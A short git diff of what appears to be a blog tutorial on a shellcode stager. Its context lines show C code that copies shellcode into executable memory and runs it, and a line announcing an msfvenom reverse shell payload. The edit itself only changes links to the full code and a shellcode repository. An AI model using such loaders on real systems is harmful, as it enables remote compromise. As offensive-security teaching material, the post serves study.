@@ -82,7 +82,8 @@ memcpy(exec, shellcode, sizeof shellcode);
 ((void(*)())exec)();
 ```
 
-And that's about it ! I snipped small parts, full code is on my [shellcode repos](https://github.com/20100dbg/shellcodes).
+And that's about it ! I snipped small parts, full code is [here](/assets/images/post-20240426/stager.c).
+Don't forget to browse my [shellcode repos](https://github.com/20100dbg/shellcodes).
 Now we need to generate a reverse shell payload, let's use msfvenom :
 
 ```
